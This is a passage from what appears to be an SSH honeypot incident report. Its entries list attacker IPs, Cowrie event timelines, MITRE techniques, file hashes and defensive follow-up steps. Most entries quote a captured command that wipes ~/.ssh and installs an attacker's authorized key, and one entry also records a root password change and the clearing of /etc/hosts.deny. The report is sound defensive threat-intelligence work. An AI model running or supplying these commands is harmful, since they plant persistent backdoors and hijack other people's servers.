| `2026-04-27 10:48:22` | `cowrie.log.closed` |
| `2026-04-27 10:48:22` | `cowrie.session.params` |
| `2026-04-27 10:48:22` | `cowrie.command.input` |
| `2026-04-27 10:48:22` | `cowrie.session.file_download` |
| `2026-04-27 10:48:22` | `cowrie.log.closed` |
| `2026-04-27 10:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.40[.]180` to AbuseIPDB if not already reported
- [ ] Block `42.51.40[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7efd03faa3db

| Field | Detail |
|---|---|
| **Source IP** | `167.86.108[.]126` |
| **First Seen** | 2026-04-27 11:41 |
| **Last Seen** | 2026-04-27 11:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:41:20` | `cowrie.session.connect` |
| `2026-04-27 11:41:20` | `cowrie.client.version` |
| `2026-04-27 11:41:20` | `cowrie.client.kex` |
| `2026-04-27 11:41:21` | `cowrie.login.success` |
| `2026-04-27 11:41:21` | `cowrie.session.params` |
| `2026-04-27 11:41:21` | `cowrie.command.input` |
| `2026-04-27 11:41:21` | `cowrie.command.failed` |
| `2026-04-27 11:41:21` | `cowrie.log.closed` |
| `2026-04-27 11:41:21` | `cowrie.session.params` |
| `2026-04-27 11:41:21` | `cowrie.command.input` |
| `2026-04-27 11:41:21` | `cowrie.session.file_download` |
| `2026-04-27 11:41:21` | `cowrie.log.closed` |
| `2026-04-27 11:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.108[.]126` to AbuseIPDB if not already reported
- [ ] Block `167.86.108[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d87b68026ac

| Field | Detail |
|---|---|
| **Source IP** | `167.86.108[.]126` |
| **First Seen** | 2026-04-27 11:41 |
| **Last Seen** | 2026-04-27 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:41:23` | `cowrie.session.connect` |
| `2026-04-27 11:41:23` | `cowrie.client.version` |
| `2026-04-27 11:41:24` | `cowrie.client.kex` |
| `2026-04-27 11:41:24` | `cowrie.login.success` |
| `2026-04-27 11:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.108[.]126` to AbuseIPDB if not already reported
- [ ] Block `167.86.108[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f918fa7c2f6

| Field | Detail |
|---|---|
| **Source IP** | `70.114.116[.]180` |
| **First Seen** | 2026-04-27 11:46 |
| **Last Seen** | 2026-04-27 11:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:46:21` | `cowrie.session.connect` |
| `2026-04-27 11:46:21` | `cowrie.client.version` |
| `2026-04-27 11:46:21` | `cowrie.client.kex` |
| `2026-04-27 11:46:22` | `cowrie.login.success` |
| `2026-04-27 11:46:23` | `cowrie.session.params` |
| `2026-04-27 11:46:23` | `cowrie.command.input` |
| `2026-04-27 11:46:23` | `cowrie.command.failed` |
| `2026-04-27 11:46:23` | `cowrie.log.closed` |
| `2026-04-27 11:46:24` | `cowrie.session.params` |
| `2026-04-27 11:46:24` | `cowrie.command.input` |
| `2026-04-27 11:46:24` | `cowrie.session.file_download` |
| `2026-04-27 11:46:24` | `cowrie.log.closed` |
| `2026-04-27 11:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.114.116[.]180` to AbuseIPDB if not already reported
- [ ] Block `70.114.116[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2020f2392ee7

| Field | Detail |
|---|---|
| **Source IP** | `70.114.116[.]180` |
| **First Seen** | 2026-04-27 11:46 |
| **Last Seen** | 2026-04-27 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:46:27` | `cowrie.session.connect` |
| `2026-04-27 11:46:27` | `cowrie.client.version` |
| `2026-04-27 11:46:27` | `cowrie.client.kex` |
| `2026-04-27 11:46:28` | `cowrie.login.success` |
| `2026-04-27 11:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.114.116[.]180` to AbuseIPDB if not already reported
- [ ] Block `70.114.116[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b667b758816

| Field | Detail |
|---|---|
| **Source IP** | `43.134.187[.]172` |
| **First Seen** | 2026-04-27 11:47 |
| **Last Seen** | 2026-04-27 11:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:47:48` | `cowrie.session.connect` |
| `2026-04-27 11:47:48` | `cowrie.client.version` |
| `2026-04-27 11:47:48` | `cowrie.client.kex` |
| `2026-04-27 11:47:49` | `cowrie.login.success` |
| `2026-04-27 11:47:49` | `cowrie.session.params` |
| `2026-04-27 11:47:49` | `cowrie.command.input` |
| `2026-04-27 11:47:49` | `cowrie.command.failed` |
| `2026-04-27 11:47:49` | `cowrie.log.closed` |
| `2026-04-27 11:47:49` | `cowrie.session.params` |
| `2026-04-27 11:47:49` | `cowrie.command.input` |
| `2026-04-27 11:47:49` | `cowrie.session.file_download` |
| `2026-04-27 11:47:49` | `cowrie.log.closed` |
| `2026-04-27 11:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.187[.]172` to AbuseIPDB if not already reported
- [ ] Block `43.134.187[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f594d32eb7c

| Field | Detail |
|---|---|
| **Source IP** | `43.134.187[.]172` |
| **First Seen** | 2026-04-27 11:47 |
| **Last Seen** | 2026-04-27 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:47:52` | `cowrie.session.connect` |
| `2026-04-27 11:47:52` | `cowrie.client.version` |
| `2026-04-27 11:47:52` | `cowrie.client.kex` |
| `2026-04-27 11:47:52` | `cowrie.login.success` |
| `2026-04-27 11:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.134.187[.]172` to AbuseIPDB if not already reported
- [ ] Block `43.134.187[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610f5ce350f8

| Field | Detail |
|---|---|
| **Source IP** | `121.134.60[.]125` |
| **First Seen** | 2026-04-27 11:58 |
| **Last Seen** | 2026-04-27 11:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:v93Pc6qglKjX"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 11:58:01` | `cowrie.session.connect` |
| `2026-04-27 11:58:01` | `cowrie.client.version` |
| `2026-04-27 11:58:02` | `cowrie.client.kex` |
| `2026-04-27 11:58:03` | `cowrie.login.success` |
| `2026-04-27 11:58:03` | `cowrie.session.params` |
| `2026-04-27 11:58:03` | `cowrie.command.input` |
| `2026-04-27 11:58:03` | `cowrie.command.failed` |
| `2026-04-27 11:58:03` | `cowrie.log.closed` |
| `2026-04-27 11:58:04` | `cowrie.session.params` |
| `2026-04-27 11:58:04` | `cowrie.command.input` |
| `2026-04-27 11:58:04` | `cowrie.session.file_download` |
| `2026-04-27 11:58:04` | `cowrie.log.closed` |
| `2026-04-27 11:58:05` | `cowrie.session.params` |
| `2026-04-27 11:58:05` | `cowrie.command.input` |
| `2026-04-27 11:58:05` | `cowrie.log.closed` |
| `2026-04-27 11:58:06` | `cowrie.session.params` |
| `2026-04-27 11:58:06` | `cowrie.command.input` |
| `2026-04-27 11:58:06` | `cowrie.log.closed` |
| `2026-04-27 11:58:07` | `cowrie.session.params` |
| `2026-04-27 11:58:07` | `cowrie.command.input` |
| `2026-04-27 11:58:07` | `cowrie.session.file_download` |
| `2026-04-27 11:58:07` | `cowrie.log.closed` |
| `2026-04-27 11:58:08` | `cowrie.session.params` |
| `2026-04-27 11:58:08` | `cowrie.command.input` |
| `2026-04-27 11:58:10` | `cowrie.log.closed` |
| `2026-04-27 11:58:10` | `cowrie.session.params` |
| `2026-04-27 11:58:10` | `cowrie.command.input` |
| `2026-04-27 11:58:10` | `cowrie.log.closed` |
| `2026-04-27 11:58:11` | `cowrie.session.params` |
| `2026-04-27 11:58:11` | `cowrie.command.input` |
| `2026-04-27 11:58:11` | `cowrie.command.input` |
| `2026-04-27 11:58:11` | `cowrie.log.closed` |
| `2026-04-27 11:58:11` | `cowrie.session.params` |
| `2026-04-27 11:58:11` | `cowrie.command.input` |
| `2026-04-27 11:58:11` | `cowrie.log.closed` |
| `2026-04-27 11:58:12` | `cowrie.session.params` |
| `2026-04-27 11:58:12` | `cowrie.command.input` |
| `2026-04-27 11:58:12` | `cowrie.log.closed` |
| `2026-04-27 11:58:13` | `cowrie.session.params` |
| `2026-04-27 11:58:13` | `cowrie.command.input` |
| `2026-04-27 11:58:13` | `cowrie.log.closed` |
| `2026-04-27 11:58:14` | `cowrie.session.params` |
| `2026-04-27 11:58:14` | `cowrie.command.input` |
| `2026-04-27 11:58:14` | `cowrie.log.closed` |
| `2026-04-27 11:58:15` | `cowrie.session.params` |
| `2026-04-27 11:58:15` | `cowrie.command.input` |
| `2026-04-27 11:58:16` | `cowrie.log.closed` |
| `2026-04-27 11:58:17` | `cowrie.session.params` |
| `2026-04-27 11:58:17` | `cowrie.command.input` |
| `2026-04-27 11:58:17` | `cowrie.log.closed` |
| `2026-04-27 11:58:17` | `cowrie.session.params` |
| `2026-04-27 11:58:17` | `cowrie.command.input` |
| `2026-04-27 11:58:17` | `cowrie.log.closed` |
| `2026-04-27 11:58:18` | `cowrie.session.params` |
| `2026-04-27 11:58:18` | `cowrie.command.input` |
| `2026-04-27 11:58:18` | `cowrie.log.closed` |
| `2026-04-27 11:58:18` | `cowrie.session.params` |
| `2026-04-27 11:58:18` | `cowrie.command.input` |
| `2026-04-27 11:58:19` | `cowrie.log.closed` |
| `2026-04-27 11:58:20` | `cowrie.session.params` |
| `2026-04-27 11:58:20` | `cowrie.command.input` |
| `2026-04-27 11:58:20` | `cowrie.log.closed` |
| `2026-04-27 11:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.134.60[.]125` to AbuseIPDB if not already reported
- [ ] Block `121.134.60[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c94a4da30fe

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:10 |
| **Last Seen** | 2026-04-27 12:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:10:48` | `cowrie.session.connect` |
| `2026-04-27 12:10:48` | `cowrie.client.version` |
| `2026-04-27 12:10:48` | `cowrie.client.kex` |
| `2026-04-27 12:10:49` | `cowrie.login.success` |
| `2026-04-27 12:10:50` | `cowrie.session.params` |
| `2026-04-27 12:10:50` | `cowrie.command.input` |
| `2026-04-27 12:10:50` | `cowrie.command.failed` |
| `2026-04-27 12:10:50` | `cowrie.log.closed` |
| `2026-04-27 12:10:51` | `cowrie.session.params` |
| `2026-04-27 12:10:51` | `cowrie.command.input` |
| `2026-04-27 12:10:51` | `cowrie.session.file_download` |
| `2026-04-27 12:10:51` | `cowrie.log.closed` |
| `2026-04-27 12:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d8073ef3fd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:10 |
| **Last Seen** | 2026-04-27 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:10:55` | `cowrie.session.connect` |
| `2026-04-27 12:10:55` | `cowrie.client.version` |
| `2026-04-27 12:10:55` | `cowrie.client.kex` |
| `2026-04-27 12:10:56` | `cowrie.login.success` |
| `2026-04-27 12:10:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db4990292ce

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:12 |
| **Last Seen** | 2026-04-27 12:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:12:56` | `cowrie.session.connect` |
| `2026-04-27 12:12:56` | `cowrie.client.version` |
| `2026-04-27 12:12:57` | `cowrie.client.kex` |
| `2026-04-27 12:12:58` | `cowrie.login.success` |
| `2026-04-27 12:12:59` | `cowrie.session.params` |
| `2026-04-27 12:12:59` | `cowrie.command.input` |
| `2026-04-27 12:12:59` | `cowrie.command.failed` |
| `2026-04-27 12:12:59` | `cowrie.log.closed` |
| `2026-04-27 12:13:00` | `cowrie.session.params` |
| `2026-04-27 12:13:00` | `cowrie.command.input` |
| `2026-04-27 12:13:00` | `cowrie.session.file_download` |
| `2026-04-27 12:13:00` | `cowrie.log.closed` |
| `2026-04-27 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf846dfa45c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:13 |
| **Last Seen** | 2026-04-27 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:13:03` | `cowrie.session.connect` |
| `2026-04-27 12:13:03` | `cowrie.client.version` |
| `2026-04-27 12:13:04` | `cowrie.client.kex` |
| `2026-04-27 12:13:05` | `cowrie.login.success` |
| `2026-04-27 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e80eba937f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:14 |
| **Last Seen** | 2026-04-27 12:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:14:01` | `cowrie.session.connect` |
| `2026-04-27 12:14:01` | `cowrie.client.version` |
| `2026-04-27 12:14:02` | `cowrie.client.kex` |
| `2026-04-27 12:14:03` | `cowrie.login.success` |
| `2026-04-27 12:14:04` | `cowrie.session.params` |
| `2026-04-27 12:14:04` | `cowrie.command.input` |
| `2026-04-27 12:14:04` | `cowrie.command.failed` |
| `2026-04-27 12:14:04` | `cowrie.log.closed` |
| `2026-04-27 12:14:05` | `cowrie.session.params` |
| `2026-04-27 12:14:05` | `cowrie.command.input` |
| `2026-04-27 12:14:05` | `cowrie.session.file_download` |
| `2026-04-27 12:14:05` | `cowrie.log.closed` |
| `2026-04-27 12:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b051675d0bb

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:14 |
| **Last Seen** | 2026-04-27 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:14:08` | `cowrie.session.connect` |
| `2026-04-27 12:14:08` | `cowrie.client.version` |
| `2026-04-27 12:14:09` | `cowrie.client.kex` |
| `2026-04-27 12:14:10` | `cowrie.login.success` |
| `2026-04-27 12:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-332835785c4a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-27 12:15 |
| **Last Seen** | 2026-04-27 12:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 12:15:04` | `cowrie.session.connect` |
| `2026-04-27 12:15:04` | `cowrie.client.version` |
| `2026-04-27 12:15:05` | `cowrie.client.kex` |
| `2026-04-27 12:15:06` | `cowrie.login.success` |
| `2026-04-27 12:15:07` | `cowrie.session.params` |
| `2026-04-27 12:15:07` | `cowrie.command.input` |
| `2026-04-27 12:15:07` | `cowrie.command.failed` |
| `2026-04-27 12:15:07` | `cowrie.log.closed` |
| `2026-04-27 12:15:08` | `cowrie.session.params` |
